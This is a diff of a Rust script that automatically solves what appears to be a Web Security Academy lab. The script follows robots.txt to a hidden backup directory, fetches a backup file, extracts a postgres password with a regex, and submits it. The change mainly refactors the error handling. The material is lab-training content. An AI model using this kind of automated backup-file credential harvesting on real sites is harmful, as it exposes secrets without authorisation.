@@ -10,7 +10,7 @@
 *        2. List the hidden directory
 *        3. Fetch the hidden backup file
 *        4. Extract the key
-*        5. Submit solution
+*        5. Submit the solution
 *
 ***************************************************************/
 #![allow(unused)]
@@ -31,127 +31,114 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0adf007f03dd1eb884b46ae100220011.web-security-academy.net";
+    let url = "https://0a02002404bb06ec8272cf2000290076.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
     println!(
         "{} {}",
-        "1. Fetching the robots.txt file..".white(),
+        "⦗1⦘ Fetching the robots.txt file..".white(),
         "OK".green()
     );
 
-    // check /robots.txt file
-    let get_robots = client.get(format!("{url}/robots.txt")).send();
+    // fetch the robots.txt file
+    let robots = client
+        .get(format!("{url}/robots.txt"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to fetch the robots.txt file".red()
+        ));
 
-    // if response is OK
-    if let Ok(res) = get_robots {
-        // get the body of the response
-        let body = res.text().unwrap();
+    // get the body of the response
+    let mut body = robots.text().unwrap();
 
-        // extract the hidden name
-        let hidden = capture_pattern("Disallow: (.*)", &body);
+    // extract the hidden name
+    let hidden = capture_pattern("Disallow: (.*)", &body).expect(&format!(
+        "{}",
+        "[!] Failed to extract the hidden name".red()
+    ));
 
-        // if the href is found
-        if let Some(text) = hidden {
-            println!(
-                "{} {} => {}",
-                "2. Searching for hidden files..".white(),
-                "OK".green(),
-                text.yellow()
-            );
+    println!(
+        "{} {} => {}",
+        "⦗2⦘ Searching for hidden files..".white(),
+        "OK".green(),
+        hidden.yellow()
+    );
 
-            // fetch the backup directory
-            let backup = client.get(format!("{url}{text}")).send();
+    // fetch the backup directory
+    let backup_dir = client.get(format!("{url}{hidden}")).send().expect(&format!(
+        "{}",
+        "[!] Failed to fetch the backup directory".red()
+    ));
 
-            // if fetching is OK
-            if let Ok(res) = backup {
-                println!(
-                    "{} {}",
-                    "3. Fetching the backup directory..".white(),
-                    "OK".green()
-                );
+    println!(
+        "{} {}",
+        "⦗3⦘ Fetching the backup directory..".white(),
+        "OK".green()
+    );
 
-                // get the body of the backup directory
-                let body = res.text().unwrap();
+    // get the body of the backup directory
+    body = backup_dir.text().unwrap();
 
-                // extract path to the backup file
-                let backup_file = capture_pattern("href='(.*)'>", &body);
+    // extract path to the backup file
+    let backup_file_path = capture_pattern("href='(.*)'>", &body).expect(&format!(
+        "{}",
+        "[!] Failed to extract path to the backup file".red()
+    ));
 
-                // if the backup file is found
-                if let Some(text) = backup_file {
-                    println!(
-                        "{} {} => {}",
-                        "4. Extracting the path to the backup file..".white(),
-                        "OK".green(),
-                        text.yellow()
-                    );
+    println!(
+        "{} {} => {}",
+        "⦗4⦘ Extracting the path to the backup file..".white(),
+        "OK".green(),
+        backup_file_path.yellow()
+    );
 
-                    // fetch the backup file
-                    let get_backup = client.get(format!("{url}{text}")).send();
+    // fetch the backup file
+    let backup_file = client
+        .get(format!("{url}{backup_file_path}"))
+        .send()
+        .expect(&format!("{}", "[!] Failed to fetch the backup file".red()));
 
-                    // if response is OK
-                    if let Ok(res) = get_backup {
-                        println!(
-                            "{} {}",
-                            "5. Fetching the backup file..".white(),
-                            "OK".green()
-                        );
+    println!(
+        "{} {}",
+        "⦗5⦘ Fetching the backup file..".white(),
+        "OK".green()
+    );
 
-                        // get the body of the response
-                        let body = res.text().unwrap();
+    // get the body of the response
+    body = backup_file.text().unwrap();
 
-                        // try to extract the key
-                        let key_pattern =
-                            capture_pattern(r#"\"postgres\",\s*\"postgres\",\s*\"(.*)\""#, &body);
+    // extract the key
+    let key = capture_pattern(r#"\"postgres\",\s*\"postgres\",\s*\"(.*)\""#, &body)
+        .expect(&format!("{}", "[!] Failed to extract the key".red()));
 
-                        // if the key is found
-                        if let Some(text) = key_pattern {
-                            println!(
-                                "{} {} => {}",
-                                "6. Extracting key ..".white(),
-                                "OK".green(),
-                                text.yellow()
-                            );
+    println!(
+        "{} {} => {}",
+        "⦗6⦘ Extracting key ..".white(),
+        "OK".green(),
+        key.yellow()
+    );
 
-                            // submit solution
-                            let submit_answer = client
-                                .post(format!("{url}/submitSolution"))
-                                .form(&HashMap::from([("answer", text)]))
-                                .send();
+    // submit the solution
+    client
+        .post(format!("{url}/submitSolution"))
+        .form(&HashMap::from([("answer", key)]))
+        .send();
 
-                            // if submitting is successful
-                            if let Ok(res) = submit_answer {
-                                println!("{} {}", "7. Submitting solution..".white(), "OK".green());
-                                println!(
-                                    "{} {}",
-                                    "🗹 Check your browser, it should be marked now as"
-                                        .white()
-                                        .bold(),
-                                    "solved".green().bold()
-                                )
-                            } else {
-                                println!("{}", "[!] Failed to submit solution".red())
-                            }
-                        } else {
-                            println!("{}", "[!] Failed to find any keys".red())
-                        }
-                    } else {
-                        println!("{}", "[!] Failed to fetch backup file".red())
-                    }
-                } else {
-                    println!("{}", "[!] Failed to extract the backup file".red())
-                }
-            } else {
-                println!("{}", "[!] Failed to list the hidden directory".red())
-            }
-        } else {
-            println!("{}", "[!] Failed to extract the hidden directory".red())
-        }
-    } else {
-        println!("{}", "[!] Failed to fetch /robots.txt file".red())
-    }
+    println!(
+        "{} {}",
+        "⦗7⦘ Submitting the solution..".white(),
+        "OK".green()
+    );
+    println!(
+        "{} {}",
+        "🗹 Check your browser, it should be marked now as"
+            .white()
+            .bold(),
+        "solved".green().bold()
+    )
 }
 
 /*******************************************************************
